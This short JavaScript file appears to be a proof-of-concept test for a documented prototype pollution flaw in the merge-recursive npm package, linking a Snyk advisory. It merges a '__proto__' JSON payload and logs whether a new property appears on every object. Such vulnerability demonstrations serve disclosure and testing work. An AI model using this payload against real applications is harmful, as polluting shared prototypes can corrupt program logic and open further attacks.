// //https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
// test("prototype pollution in merge-recursive", () => {
  const merge = require("merge-recursive").recursive;
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  obj = {};

console.log({}.polluted);

  merge({}, JSON.parse(malicious_payload));

console.log({}.polluted);
// });
